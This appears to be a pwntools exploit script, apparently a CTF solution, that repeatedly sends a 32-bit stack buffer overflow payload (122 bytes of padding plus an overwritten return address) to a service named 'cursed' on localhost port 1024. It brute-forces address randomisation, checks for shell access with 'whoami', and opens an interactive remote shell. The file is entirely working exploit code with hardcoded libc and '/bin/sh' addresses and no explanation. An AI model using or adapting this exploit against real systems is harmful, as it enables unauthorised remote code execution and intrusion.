from tqdm import tqdm
from pwn import *

context.arch = "i386"
log.level = "CRITICAL"

OFFSET = 122
BASE = 0xf7dc3000
BINSH = 0xf7f4e363
for i in tqdm(range(1024)):
    r = remote("localhost", 1024)
    #r = gdb.debug("./docker/cursed",  '''
    #c''')
    system = 0xf7e8b580
    exits = 0xf7df6ed0
    payload = b"A"*(OFFSET) + p32(0x5655626e)
    #print(payload)
    try:
        r.sendline(payload)
        r.sendline("whoami")
        log.info(str(r.recvuntil(b'ctf')) + "????????????????????????????")
        #r.interactive()
        break
    except:
        pass
r.interactive()